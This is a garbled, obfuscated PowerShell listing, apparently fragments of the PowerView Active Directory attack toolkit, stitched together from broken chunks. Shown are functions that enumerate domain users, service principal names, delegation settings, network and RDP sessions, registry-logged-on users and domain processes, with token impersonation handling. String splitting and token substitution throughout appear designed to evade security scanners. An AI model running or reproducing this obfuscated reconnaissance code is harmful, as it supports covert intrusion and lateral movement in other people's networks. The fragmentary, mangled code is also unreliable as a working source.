        if (YoV{PIJKSBouIJKNIJKDIJKpaRAmeters}[(Z3b{0}{1}{2}Z3b-f S5zSS5z,S5zearcS5z,S5zhBaseS5z)]) { YoV{SeIJKARchIJKerarGUIJKMIJKents}[(Z3b{2}{1}{0}Z3b-f S5zBaseS5z,S5zchS5z,S5zSearS5z)] = YoV{sEArcIJKhIJKBAIJKsE} }
        if (YoV{PIJKsIJKBOUndIJKPAramIJKEIJKTeRS}[(Z3b{1}{0}Z3b -fS5zverS5z,S5zSerS5z)]) { YoV{sIJKeARchErARguMEIJKNIJKTS}[(Z3b{1}{0}{2}Z3b-fS5zvS5z,S5zSerS5z,S5zerS5z)] = YoV{SeRvIJKEr} }
        if (YoV{PIJKsIJKBOUnDIJKParamETIJKeRs}[(Z3b{3}{1}{2}{0}Z3b -f S5zrchScopeS5z,S5zeS5z,S5zaS5z,S5zSS5z)]) { YoV{SEARIJKchIJKeRIJKArgUMIJKentS}[(Z3b{1}{0}{2}Z3b-fS5zScopS5z,S5zSearchS5z,S5zeS5z)] = YoV{seaRIJKCIJKhscOPe} }
        if (YoV{PSIJKBoUnDIJKPIJKArAIJKMIJKeTeRS}[(Z3b{2}{1}{0}Z3b -fS5zizeS5z,S5zeSS5z,S5zResultPagS5z)]) { YoV{SIJKearIJKChIJKEIJKRAIJKRguMEntS}[(Z3b{3}{1}{2}{0}Z3b-f S5zeSizeS5z,S5zesuS5z,S5zltPagS5z,S5zRS5z)] = YoV{rIJKeSuLTpIJKAIJKGeSizE} }
     ','IJKFO})
                YoV{COmpIJKUTErsIJKiIJKTe} JGO &(Z3b{2}{0}{3}{1}Z3b -fS5zd-MS5z,S5zrS5z,S5zAdS5z,S5zembeS5z) (Z3b{2}{1}{0}Z3b -f S5ztyS5z,S5zrS5z,S5zNotepropeS5z) (Z3b{2}{0}{1}Z3b -fS5zNS5z,S5zameS5z,S5zSiteS5z) YoV{sITEIJKNIJKAMe}
            }
            else {
                &(Z3b{3}{0}{4}{2}{1}Z3b -f S5zrS5z,S5zseS5z,S5zboS5z,S5zWS5z,S5zite-VerS5z) Z3b[Get-NetComputerSiteName] Error: YoV(([ComponentModel.Win32Exception] YoVResult).Message) Z3b
                YoV{ComIJKpIJKUIJKTEIJKRsItE} JGO &(Z3b{1}{2}{0}Z3b -fS5zerS5z,S5zAddS5z,S5z-MembS5z) (Z3b{1}{2}{0}Z3b-fS5ztyS5z,S5zNotepropeS5z,S5zrS5z) (Z3b{2}{0}{1}Z3b -fS5ziteNS5z,S5zameS5z,S5zSS5z) S5zS5z
            }
            YoV{coIJKMpuTERIJKSite}.Z3bPsOIJKBJeCTZ3b.Z3btIJKyIJKPenAMeSZ3b.(Z3b{0}{1}Z3b-fS5zInseS5z,S5zrtS5z).Invoke(0, (Z3b{1}{2}{3}{4}{0}Z3b -fS5zterSiteS5z,S5zPowerVS5z,S5ziewS5z,S5z.CompS5z,S5zuS5z))

            
            YoV{nIJKUll} = YoV{nETIJKAPIJKI32}::(Z3b{0}{3}{1}{4}{2}Z3b-fS5zNeS5z,S5zuS5z,S5zeeS5z,S5ztApiBS5z,S5zfferFrS5z).Invoke(YoV{ptIJKRInIJKFo})

            YoV{ComPutIJKeRIJKSITe}
        }
    }

    END {
        if (YoV{LOGoIJKNIJKTIJKoken}) {
            &(Z3b{1}{4}{5}{2}{3}{0}Z3b -f S5zelfS5z,S5zIS5z,S5zke-RevertToS5z,S5zSS5z,S5znvS5z,S5zoS5z) -TokenHandle YoV{lOGIJKoNtoKIJKeN}
        }
    }
}


function gEt-WmirIJKeIJKGPRIJKoXY {


    [OutputType({Z3b{1}{0}{4}{3}{2}Z3b-f S5zView.S5z,S5zPowerS5z,S5ztingsS5z,S5ztS5z,S5zProxySeS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsItIon = 0, vaLuEfroMPIPeline = YoV{TIJKRue}, vaLuEFrOmpiPELineByprOpeRtYName = YoV{TRIJKUE})]
        [Alias({Z3b{0}{2}{1}Z3b-f S5zHostNS5z,S5zeS5z,S5zamS5z}, {Z3b{1}{2}{0}{3}Z3b -f S5zoS5z,S5zdnsS5z,S5zhS5z,S5zstnameS5z}, {Z3b{1}{0}Z3b-f S5zmeS5z,S5znaS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{ComPUIJKTIJKeRNAMe} = YoV{enV:cIJKoMPUIJKTERNAIJKme},

  ','{5}{6}{2}{1}{11}{8}{3}{0}{12}{7}{9}Z3b-fS5zOrS5z,S5zcialS5z,S5zions.SpeS5z,S5zed.S5z,S5zSysS5z,S5zeS5z,S5zm.CollectS5z,S5zictiS5z,S5zzS5z,S5zonaryS5z,S5ztS5z,S5ziS5z,S5zderedDS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(MANdATOry = YoV{TRIJKUe}, vAlUEFRoMPipELinE = YoV{tIJKRUe}, VaLUEFRomPiPElIneBYpRoPeRTYNaME = YoV{TrIJKUe})]
        [Alias(S5zUACS5z, {Z3b{0}{2}{3}{1}Z3b-fS5zuseS5z,S5zolS5z,S5zracS5z,S5zcountcontrS5z})]
        [Int]
        YoV{vAlIJKUe},

        [Switch]
        YoV{SIJKhoIJKwaLL}
    )

    BEGIN {
        
        YoV{uIJKAcVALUIJKes} = &(Z3b{3}{2}{0}{1}Z3b -fS5zbjecS5z,S5ztS5z,S5z-OS5z,S5zNewS5z) (Z3b{13}{8}{3}{12}{0}{4}{11}{2}{9}{6}{10}{7}{1}{5}Z3b-fS5z.SS5z,S5zoS5z,S5z.OS5z,S5zonS5z,S5zpecialiS5z,S5znaryS5z,S5zedS5z,S5zictiS5z,S5ztem.CollectiS5z,S5zrderS5z,S5zDS5z,S5zzedS5z,S5zsS5z,S5zSysS5z)
        YoV{UaCvAIJKluIJKES}.(Z3b{1}{0}Z3b -f S5zdS5z,S5zAdS5z).Invoke((Z3b{2}{0}{1}Z3b -fS5zCRIPS5z,S5zTS5z,S5zSS5z), 1)
        YoV{uaCVIJKAlIJKUIJKeS}.(Z3b{0}{1}Z3b-fS5zAS5z,S5zddS5z).Invoke((Z3b{2}{3}{1}{4}{0}Z3b-f S5zABLES5z,S5zUNTDS5z,S5zACS5z,S5zCOS5z,S5zISS5z), 2)
        YoV{UaCIJKVIJKAlUes}.(Z3b{0}{1}Z3b-fS5zAS5z,S5zddS5z).Invoke((Z3b{4}{3}{1}{2}{0}Z3b -f S5zDS5z,S5zRS5z,S5zEQUIRES5z,S5zDIR_S5z,S5zHOMES5z), 8)
        YoV{uAIJKCIJKVAlUeS}.(Z3b{0}{1}Z3b -f S5zAS5z,S5zddS5z).Invoke((Z3b{1}{2}{0}Z3b-f S5zKOUTS5z,S5zLS5z,S5zOCS5z), 16)
        YoV{UaIJKcIJKVaLues}.(Z3b{0}{1}Z3b -f S5zAS5z,S5zddS5z).Invoke((Z3b{4}{3}{0}{1}{2}Z3b -f S5zWD_NOS5z,S5zTRES5z,S5zQDS5z,S5zASSS5z,S5zPS5z), 32)
        YoV{uaIJKcvAlIJKUEs}.(Z3b{1}{0}Z3b -f S5zdS5z,S5zAdS5z).Invoke((Z3b{1}{4}{0','guiSIJKHednAIJKMeZ3b
            YoV{gRouPIJKDoIJKmaIJKIN} = YoV{grIJKoupdIJKiIJKstiNguIJKishIJKEdnamE}.(Z3b{2}{1}{0}Z3b -f S5zgS5z,S5zStrinS5z,S5zSubS5z).Invoke(YoV{GIJKRoIJKUpdISTinGUiIJKSIJKheDnIJKAIJKmE}.(Z3b{1}{0}{2}Z3b -f S5zexS5z,S5zIndS5z,S5zOfS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z

            YoV{_}.Z3bmEmBIJKERZ3b JGO &(Z3b{3}{0}{2}{4}{1}Z3b-f S5zEachS5z,S5ztS5z,S5z-OS5z,S5zForS5z,S5zbjecS5z) {
                
                
                YoV{MIJKEIJKMBERdoMIJKAiN} = YoV{_}.(Z3b{1}{2}{0}Z3b-f S5ztringS5z,S5zSuS5z,S5zbSS5z).Invoke(YoV{_}.(Z3b{0}{2}{1}Z3b-fS5zIS5z,S5zxOfS5z,S5zndeS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z
                if ((YoV{_} -match (Z3b{2}{1}{3}{0}Z3b-fS5z*S5z,S5z1S5z,S5zCN=S-S5z,S5z-5-21.*-.S5z)) -or (YoV{gIJKROuPDIJKoIJKMAIn} -ne YoV{MIJKeMIJKBerDOIJKmaIN})) {
                    YoV{MeIJKMbeRDIJKIsTiIJKNgUIJKIIJKSheIJKDnaMe} = YoV{_}
                    YoV{MEIJKmBIJKeRIJKNamE} = YoV{_}.(Z3b{1}{0}Z3b -fS5zplitS5z,S5zSS5z).Invoke(S5z,S5z)[0].(Z3b{1}{0}Z3b-fS5zlitS5z,S5zspS5z).Invoke(S5z=S5z)[1]

         ','KsE} }
            if (YoV{psbOuIJKNDpArIJKAIJKMETeRs}[(Z3b{1}{0}Z3b-f S5zerS5z,S5zServS5z)]) { YoV{GRIJKOIJKUIJKPsEaIJKRchERArGUmenIJKTs}[(Z3b{1}{0}Z3b -fS5zerverS5z,S5zSS5z)] = YoV{seRIJKVIJKEr} }
            if (YoV{psBIJKOuNDIJKParaIJKmEtERS}[(Z3b{1}{2}{0}{3}Z3b-fS5zhSS5z,S5zSeS5z,S5zarcS5z,S5zcopeS5z)]) { YoV{GRIJKouPSeaIJKRcHIJKEIJKRaRgUmEIJKNTs}[(Z3b{2}{1}{0}Z3b -fS5zcopeS5z,S5zarchSS5z,S5zSeS5z)] = YoV{SEaIJKRcIJKhscIJKopE} }
            if (YoV{pSIJKBoUndParaIJKMIJKEtERs}[(Z3b{2}{0}{4}{3}{1}Z3b -f S5zesuS5z,S5zeSizeS5z,S5zRS5z,S5zgS5z,S5zltPaS5z)]) { YoV{GRIJKouPseaIJKRIJKCIJKHIJKERIJKArGuments}[(Z3b{2}{0}{1}Z3b-fS5zesultS5z,S5zPageSizeS5z,S5zRS5z)] = YoV{reSULtIJKpaIJKGEIJKSiIJKZE} }
            if (YoV{psBIJKOIJKUNDpaIJKRAIJKmIJKETErs}[(Z3b{3}{4}{2}{0}{1}Z3b -f S5zTimeLS5z,S5zimitS5z,S5zrverS5z,S5zSS5z,S5zeS5z)]) { YoV{GIJKRoIJKUPSEaRIJKCHErarGuMIJKEnIJKTS}[(Z3b{0}{4}{1}{3}{2}Z3b -fS5zSeS5z,S5zerTimeLiS5z,S5ztS5z,S5zmiS5z,S5zrvS5z)] = YoV{SeRVERIJKTIJKIMeIJKlImIt} }
            if (YoV{psBIJKOUIJKNdpIJKARaMEIJKTeRS}[(Z3b{0}{3}{2}{1}Z3b-f S5zToS5z,S5zneS5z,S5ztoS5z,S5zmbsS5z)]) { YoV{GROIJKUpseIJKArCherIJKArGUMEnIJKTs}[(Z3b{2}{1}{0}Z3b -fS5zoneS5z,S5zmbstS5z,S5zToS5z)] = YoV{tombIJKSTIJKONE} }
            if (YoV{psbIJKOUnDIJKPIJKARAmIJKEteRS}[(Z3b{1}{2}{3}{0}Z3b-fS5zialS5z,S5zCS5z,S5zreS5z,S5zdentS5z)]) { YoV{GRIJKOUPsEaIJKRChERARIJKGUmeNTS}[(Z3b{1}{2}{0}Z3b -f S5zlS5z,S5zCredentiS5z,S5zaS5z)] = YoV{CrEDeIJKNTIJKiAl} }
            YoV{tARGETIJKUsIJKErS} = &(Z3b{2}{4}{1}{3}{0}Z3b -fS5zberS5z,S5zomainGroupMS5z,S5zGeS5z,S5zemS5z,S5zt-DS5z) @GroupSearcherArguments JGO &(Z3b{1}{0}{2}Z3b -fS5zOS5z,S5zSelect-S5z,S5zbjectS5z) -ExpandProperty (Z3b{0}{3}{1}{2}Z3b -f S5zMeS5z,S5zaS5z,S5zmeS5z,S5zmberNS5z)
        }

        
        if (YoV{PIJKsbIJKounIJKdpaIJKRAmIJKeTers}[(Z3b{3}{0}{1}{2}Z3b -f S5zompuS5z,S5zterS5z,S5zNameS5z,S5zCS5z)]) {
            YoV{TIJKAIJKRGEtCOMIJKpIJKUterS} = YoV{compUIJKTIJKerIJKNaIJKme}
        }
        else {
            
            YoV{dIJKcsEarcheraRIJKGUmIJKEnIJKTs} = @{
                (Z3b{1}{0}Z3b -fS5zPS5z,S5zLDAS5z) = YoV{TrIJKUE}
            }
            if (YoV{pIJKSIJKBoUNIJKDparaMeteRs}[(Z3b{0}{1}Z3b-f S5zDoS5z,S5zmainS5z)]) { YoV{dIJKCsEArIJKCHEIJKRArIJKGUIJKMeNIJKTS}[(Z3b{0}{1}Z3b -fS5zDS5z,S5zomainS5z)] = YoV{domIJKAIN} }
            if (YoV{PsbOUNDIJKpIJKARIJKAmETIJKeRS}[(Z3b{0}{1}{2}Z3b -f S','rjS5z,S5zS5z).YoVTargetDomainZ3b
            }
        }
        else {
            
            &(Z3b{2}{0}{1}{3}Z3b -f S5ze-vS5z,S5zerboS5z,S5zwritS5z,S5zseS5z) (Z3b{0}{3}{1}{2}Z3b-fS5zgS5z,S5zdS5z,S5zomainS5z,S5zet-S5z)
            YoV{domAIJKiNoBjIJKeCt} = &(Z3b{2}{0}{1}Z3b-f S5z-S5z,S5zDomainS5z,S5zGetS5z)
            YoV{BINIJKDSeIJKRveR} = (YoV{doMIJKAIJKINObJEct}.Z3bpIJKdCrolEoWnIJKerZ3b).Z3bnaIJKMEZ3b
            YoV{TArIJKgeIJKTDoMaiN} = YoV{DOmaiIJKNOIJKBJEcT}.Z3bNAIJKmEZ3b
        }

        if (YoV{PSbIJKoUnDIJKParaIJKmeIJKTERS','{1}{3}{4}{2}{0}Z3b-f S5zseS5z,S5zWrS5z,S5zoS5z,S5ziS5z,S5zte-VerbS5z) (S5z[S5z+S5zGS5z+S5zet-S5z+S5zDoS5z+S5zmainS5z+S5zUser] S5z+S5zES5z+S5zxtracteS5z+S5zd S5z+S5zdomaiS5z+S5zn S5z+Z3bS5zYoVUserDomainS5z Z3b+S5zfrS5z+S5zom S5z+Z3bS5zYoVIdentityInstanceS5zZ3b)
                        YoV{UseIJKRSeaIJKRChER} = &(Z3b{3}{0}{2}{1}Z3b -fS5zDS5z,S5zainSearcherS5z,S5zomS5z,S5zGet-S5z) @SearcherArguments
                    }
                }
                else {
                    YoV{iIJKDEIJKNtITyFIJKILteR} += Z3b(samAccountName=YoVIdentityInstance)Z3b
                }
            }

            if (YoV{IDIJKentItIJKYFIIJKLTER} -and (YoV{IdEnTIJKitYIJKFIJKiLTer}.(Z3b{0}{1}Z3b-f S5zTriS5z,S5zmS5z).Invoke() -ne S5zS5z) ) {
                YoV{FIJKILtIJKeR} += Z3b(JGOYoVIdentityFilter)Z3b
            }

            if (YoV{PSBoIJKUnDIJKpARaMIJKETErS}[S5zSPNS5z]) {
                &(Z3b{1}{0}{2}Z3b-fS5zboS5z,S5zWrite-VerS5z,S5zseS5z) (Z3b{11}{6}{3}{12}{4}{7}{8}{0}{9}{2}{10}{1}{13}{5}Z3b-f S5zaS5z,S5zrvice pS5z,S5zinS5z,S5ztS5z,S5zomaiS5z,S5zincipal namesS5z,S5zeS5z,S5znUser] SS5z,S5zeS5z,S5zrchS5z,S5zg for non-null seS5z,S5z[GS5z,S5z-DS5z,S5zrS5z)
                YoV{FIJKiLIJKTEr} += ((Z3b{2}{5}{0}{3}{6}{4}{1}Z3b-f S5ziS5z,S5z=*)S5z,S5z(serS5z,S5zcePrS5z,S5zncipalNameS5z,S5zvS5z,S5ziS5z))
            }
            if (YoV{pIJKSIJKBoUIJKNIJKDparAMeIJKTers}[(Z3b{1}{4}{2}{3}{0}Z3b -fS5zonS5z,S5zAS5z,S5zwDelegaS5z,S5ztiS5z,S5zlloS5z)]) {
                &(Z3b{2}{0}{1}Z3b-f S5zVerbS5z,S5','                  YoV{SIJKessIIJKon}
                }

                
                YoV{nuIJKLl} = YoV{NeIJKTapI32}::(Z3b{1}{3}{4}{0}{2}Z3b-fS5ziBufferFrS5z,S5zNS5z,S5zeeS5z,S5zetAS5z,S5zpS5z).Invoke(YoV{PTrIJKInIJKFO})
            }
            else {
                &(Z3b{1}{2}{0}{3}Z3b-f S5z-VeS5z,S5zWritS5z,S5zeS5z,S5zrboseS5z) Z3b[Get-NetSession] Error: YoV(([ComponentModel.Win32Exception] YoVResult).Message) Z3b
            }
        }
    }


    END {
        if (YoV{loGonIJKTOIJKkIJKeN}) {
            &(Z3b{1}{2}{3}{0}Z3b -fS5z-RevertToSelfS5z,S5zIS5z,S5znS5z,S5zvokeS5z) -TokenHandle YoV{lIJKOIJKGonTOkEn}
        }
    }
}


function gEIJKT-IJKReglogGIJKedON {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{4}{1}{3}{0}{2}Z3b -f S5zhouS5z,S5zSS5z,S5zldProcessS5z,S5zSS5z,S5zPS5z}, S5zS5z)]
    [OutputType({Z3b{4}{6}{1}{3}{5}{2}{0}Z3b-f S5znUserS5z,S5zew.RegLoS5z,S5zOS5z,S5zgS5z,S5zPowerVS5z,S5zgedS5z,S5ziS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSitIoN = 0, vaLuefrOmpIPELINE = YoV{tIJKRue}, VALUeFrOMPipELInebYprOPertYnAmE = YoV{trIJKUE})]
        [Alias({Z3b{1}{0}{2}Z3b-f S5zostNS5z,S5zHS5z,S5zameS5z}, {Z3b{0}{1}{2}{3}Z3b','rEmpty()]
        [String]
        YoV{COmIJKputeRSeIJKAIJKRChbasE},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{3}{2}{0}{1}Z3b -fS5zgS5z,S5zSystemS5z,S5ztinS5z,S5zOperaS5z})]
        [String]
        YoV{cOmpuIJKTIJKeROperAIJKTINIJKGsYIJKStIJKem},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{0}{1}Z3b -f S5zvicS5z,S5zePackS5z,S5zSerS5z})]
        [String]
        YoV{cIJKOMPUTErIJKsIJKERVIJKICEpIJKACK},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{1}{0}Z3b -fS5zeS5z,S5ziteNamS5z,S5zSS5z})]
        [String]
        YoV{cOmIJKpuIJKTErsiTEnAIJKMe},

        [Parameter(ValUefROMpIpELinEBypRopERtYnAmE = YoV{TIJKRuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{GrOupnIJKAI','                elseif (YoV{TArgEtUsIJKeIJKRS} -Contains YoV{PIJKROcIJKESS}.Z3buIJKSeRZ3b) {
                            YoV{proIJKCIJKeSs}
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        
        if (YoV{pIJKsBOUnDpArAmetIJKeIJKRs}[(Z3b{1}{0}Z3b -fS5zlayS5z,S5zDeS5z)] -or YoV{pIJKsbIJKoundPArameTIJKers}[(Z3b{0}{1}{4}{2}{3}Z3b-fS5zSS5z,S5ztoS5z,S5zSuS5z,S5zccessS5z,S5zpOnS5z)]) {

            &(Z3b{3}{2}{0}{4}{1}Z3b-fS5zeS5z,S5zeS5z,S5zitS5z,S5zWrS5z,S5z-VerbosS5z) Z3b[Find-DomainProcess] Total number of hosts: YoV(YoVTargetComputers.count) Z3b
            &(Z3b{1}{','5z,S5z-MembeS5z,S5zAdS5z) (Z3b{2}{0}{3}{1}Z3b -f S5zproS5z,S5zyS5z,S5zNoteS5z,S5zpertS5z) (Z3b{0}{1}Z3b-f S5zUserNamS5z,S5zeS5z) Z3bYoV(YoVInfo.pDomainName)5rjYoV(YoVInfo.pUserName)Z3b
                        }

                        YoV{rDIJKpsIJKeIJKsSIOn} JGO &(Z3b{0}{1}{2}Z3b-fS5zAdd-MS5z,S5zemS5z,S5zberS5z) (Z3b{0}{1}{2}Z3b -f S5zNoteprS5z,S5zoS5z,S5zpertyS5z) S5zIDS5z YoV{iNIJKFO}.Z3bsIJKESsionIdZ3b
                        YoV{rDIJKPSESIJKSiIJKOn} JGO &(Z3b{2}{1}{0}Z3b -f S5zrS5z,S5zembeS5z,S5zAdd-MS5z) (Z3b{0}{1}{2}Z3b-fS5zNoteprS5z,S5zoS5z,S5zpertyS5z) (Z3b{1}{0}Z3b -fS5ztateS5z,S5zSS5z) YoV{IIJKNfO}.Z3bstIJKAtEZ3b

                        YoV{PpIJKBUIJKFfer} =   YoV{6IJKRIJKK25P}::Z3bZEIJKRoZ3b
                        YoV{pIJKByTEsrETuRIJKNeD} = 0

                        
                        
                        YoV{rEsIJKULIJKT2} = YoV{wtIJKsIJKApI32}::Z3bwTSQUERIJKYIJKseIJKSSIoNinFoRmIJKAtIJKiOnZ3b(YoV{HIJKAnDlE}, YoV{InIJKFO}.Z3bSeIJKsSiIJKONIJKIDZ3b, 14, [ref]YoV{PIJKpbuIJKFfIJKER}, [ref]YoV{pbytIJKeSRetUIJKRNeD});YoV{lAsTeIJKRIJKROR2} =   (  &(S5zLSS5z) (S5zvS5z+S5zarS5z+S5zIAble:np6YrS5z) ).Z3bvaLIJKUEZ3b::(Z3b{1}{0}{2}{3}Z3b -fS5zin3S5z,S5zGetLastWS5z,S5z2ErrS5z,S5zorS5z).Invoke()

                        if (YoV{RIJKesuIJKLT2} -eq 0) {
                            &(Z3b{2}{0}{1}Z3b -fS5zVerbosS5z,S5zeS5z,S5zWrite-S5z) Z3b[Get-NetRDPSession] Error: YoV(([ComponentModel.Win32Exception] YoVLastError2).Message) Z3b
                        }
                        else {
                            YoV{OIJKFFIJKSeT2} = YoV{pIJKPBufFIJKeR}.(Z3b{0}{1}{2','b{2}{0}{3}{1}{4}{5}Z3b-fS5zSS5z,S5zCS5z,S5zMNS5z,S5z_LOGON_AS5z,S5zCS5z,S5zOUNTS5z)               =   131072
    (Z3b{0}{3}{4}{5}{2}{1}Z3b-f S5zSMAS5z,S5zDS5z,S5zRES5z,S5zRS5z,S5zTS5z,S5zCARD_REQUIS5z)              =   262144
    (Z3b{2}{0}{3}{1}Z3b-fS5zDES5z,S5zGATIONS5z,S5zTRUSTED_FOR_S5z,S5zLES5z)          =   524288
    (Z3b{3}{2}{0}{1}Z3b-fS5zELEGAS5z,S5zTEDS5z,S5z_DS5z,S5zNOTS5z)                   =   1048576
    (Z3b{3}{2}{1}{0}Z3b -f S5zEY_ONLYS5z,S5zS_KS5z,S5zDES5z,S5zUSE_S5z)                =   2097152
    (Z3b{1}{2}{4}{0}{3}Z3b -fS5zEQ_S5z,S5zDONS5z,S5zT_S5z,S5zPREAUTHS5z,S5zRS5z)                =   4194304
    (Z3b{0}{3}{4}{1}{2}Z3b -fS5zPASSWORD_S5z,S5zES5z,S5zDS5z,S5zEXPS5z,S5zIRS5z)                =   8388608
    (Z3b{6}{0}{4}{8}{1}{5}{2}{9}{3}{7}Z3b-f S5zRS5z,S5zD_TO_AS5z,S5zTH_S5z,S5zAS5z,S5zUSTS5z,S5zUS5z,S5zTS5z,S5zTIONS5z,S5zES5z,S5zFOR_DELEGS5z)  =   16777216
    (Z3b{3}{2}{0}{1}{4}Z3b -fS5zETS_S5z,S5zAS5z,S5zSECRS5z,S5zPARTIAL_S5z,S5zCCOUNTS5z)         =   67108864
} -Bitfield


YoV{wTSIJKCIJKONNEIJKcIJKTstATe} = &(Z3b{0}{1}Z3b-f S5zpsenS5z,S5zumS5z) YoV{mIJKOD} (Z3b{4}{5}{0}{3}{2}{1}Z3b-fS5zECTSTS5z,S5zSSS5z,S5z_CLAS5z,S5zATES5z,S5zWTS_CS5z,S5zONNS5z) (Z3b{1}{0}Z3b -fS5znt16S5z,S5zUIS5z) @{
    (Z3b{0}{1}Z3b -f S5zAcS5z,S5ztiveS5z)       =    0
    (Z3b{3}{2}{1}{0}Z3b-fS5zedS5z,S5znectS5z,S5zonS5z,S5zCS5z)    =    1
    (Z3b{3}{2}{1}{0}Z3b -fS5zryS5z,S5zueS5z,S5zectQS5z,S5zConnS5z) =    2
    (Z3b{1}{0}Z3b -fS5zowS5z,S5zShadS5z)       =    3
    (Z3b{2}{0}{1}Z3b -f S5zconnS5z,S5zectedS5z,S5zDisS5z) =    4
    (Z3b{1}{0}Z3b-fS5zleS5z,S5zIdS5z)         =    5
    (Z3b{0}{1}Z3b -fS5zLisS5z,S5ztenS5z)       =    6
    (Z3b{1}{0}Z3b-fS5zesetS5z,S5zRS5z)        =    7
    (Z3b{1}{0}Z3b -f S5zwnS5z,S5zDoS5z)         =    8
    (Z3b{1}{0}Z3b -fS5znitS5z,S5zIS5z)         =    9
}


YoV{WTIJKs_IJKSessiIJKoNIJK_IJKinFo_1} = &(Z3b{0}{1}Z3b-f S5zstrucS5z,S5ztS5z) YoV{mIJKoD} (Z3b{1}{4}{0}{6}{7}{3}{2}{5}Z3b-fS5zrViewS5z,S5zPowS5z,S5zInS5z,S5zessionS5z,S5zeS5z,S5zfoS5z,S5z.S5z,S5zRDPSS5z) @{
    (Z3b{1}{0}Z3b-fS5zIdS5z,S5zExecEnvS5z) = &(Z3b{1}{0}Z3b-f S5zldS5z,S5zfieS5z) 0 (Z3b{0}{1}Z3b -f S5zUS5z,S5zInt32S5z)
    (Z3b{0}{1}Z3b -fS5zStS5z,S5zateS5z) = &(Z3b{1}{0}Z3b -fS5zldS5z,S5zfieS5z) 1 YoV{WtSIJKCOIJKNNecIJKTIJKSTAtE}
    (Z3b{0}{2}{1}Z3b -f S5zSeS5z,S5zonIdS5z,S5zssiS5z) = &(Z3b{1}{0}Z3b -f S5zieldS5z,S5zfS5z) 2 (Z3b{0}{1}Z3b-fS5zUInt3S5z,S5z2S5z)
    (Z3b{3}{0}{1}{2}Z3b-fS5zionNS5z,S5zaS5z,S5zmeS5z,S5zpSessS5z) = &(Z3b{0}{1}Z3b-f S5zfiS5z,S5zeldS5z) 3 (Z3b{0}{1}{2}Z3b-f S5zStrS5z,S5ziS5z,S5zngS5z) -MarshalAs @((Z3b{1}{0}Z3b -f S5zWStrS5z,S5zLPS5z))
    (Z3b{2}{0}{1}Z3b-fS5zHoS5z,S5zstNameS5z,S5zpS5z) = &(Z3b{1}{0}Z3b -fS5zdS5z,S5zfielS5z) 4 (Z3b{1}{2}{0}Z3b-f S5zngS5z,S5zStS5z,S5zriS5z) -MarshalAs @((Z3b{2}{1}{0}Z3b-fS5zrS5z,S5zStS5z,S5zLPWS5z))
    (Z3b{2}{0}{1}Z3b-f S5zerNaS5z,S5zmeS5z,S5zpUsS5z) = &(Z3b{1}{0}Z3b -f S5zeldS5z,S5zfiS5z) 5 (Z3b{0}{1}Z3b-fS5zStriS5z,S5zngS5z) -MarshalAs @((Z3b{0}{1}Z3b -fS5zLPS5z,S5zWStrS5z))
    (Z3b{1}{2}{0}Z3b-f S5zNameS5z,S5zpDomaiS5z,S5znS5z) = &(Z3b{0}{1}Z3b -f S5zfS5z,S5zieldS5z) 6 (Z3b{1}{0}Z3b -fS5zringS5z,S5zStS5z) -MarshalAs @((Z3b{0}{2}{1}Z3b-fS5zLPS5z,S5zrS5z,S5zWStS5z))
    (Z3b{0}{2}{1}Z3b-f S5zpFaS5z,S5zmNameS5z,S5zrS5z) = &(Z3b{1}{0}Z3b -fS5zieldS5z,S5zfS5z) 7 (Z3b{1}{0}Z3b-f S5zngS5z,S5zStriS5z) -MarshalAs @((Z3b{1}{0}Z3b -fS5zPWStrS5z,S5zLS5z))
}


YoV{WIJKTs_CLIJKIEnIJKTIJK_ADIJKDrEsS} = &(Z3b{0}{2}{1}Z3b -fS5zstrS5z,S5zctS5z,S5zuS5z) YoV{mIJKoD} (Z3b{2}{0}{3}{1}Z3b -fS5z_CLIES5z,S5zSSS5z,S5zWTSS5z,S5zNT_ADDRES5z) @{
    (Z3b{2}{0}{1}Z3b-f S5zddressFS5z,S5zamilyS5z,S5zAS5z) = &(Z3b{0}{1}Z3b-fS5zfieS5z,S5zldS5z) 0 (Z3b{1}{0}Z3b-f S5zt32S5z,S5zUInS5z)
    (Z3b{2}{0}{1}Z3b-fS5zeS5z,S5zssS5z,S5zAddrS5z) = &(Z3b{0}{1}Z3b -f S5zfiS5z,S5zeldS5z)','y @{(Z3b{1}{0}Z3b -f S5zypeS5z,S5zTS5z) = YoV{_}.Z3bLOcIJKALnaMeZ3b;(Z3b{1}{0}Z3b -f S5zeS5z,S5zValuS5z) = YoV{_}.Z3bnIJKAmeZ3b}
                        }
                    }
                    else {
                        YoV{fIJKiltIJKeRS} = YoV{NuIJKLl}
                    }

                    if (YoV{mIJKembIJKERs} -isnot [System.Array]) { YoV{mEMbIJKErs} = @(YoV{MIJKEMbERs}) }

                    YoV{gIJKRIJKOUIJKPSxMl} = &(Z3b{2}{0}{1}Z3b -f S5zbjeS5z,S5zctS5z,S5zNew-OS5z) (Z3b{2}{1}{0}Z3b-f S5zObjectS5z,S5zSS5z,S5zPS5z)
                    YoV{GIJKROUpSIJKxml} JGO &(Z3b{2}{1}{0}Z3b-f S5zemberS5z,S5z-MS5z,S5zAddS5z) (Z3b{3}{1}{2}{0}Z3b -fS5zyS5z,S5zrS5z,S5zopertS5z,S5zNotepS5z) (Z3b{2}','zNotS5z) (Z3b{0}{2}{1}Z3b -fS5zCoS5z,S5zmeS5z,S5zmputerNaS5z) YoV{CIJKoMIJKpUIJKTEr}
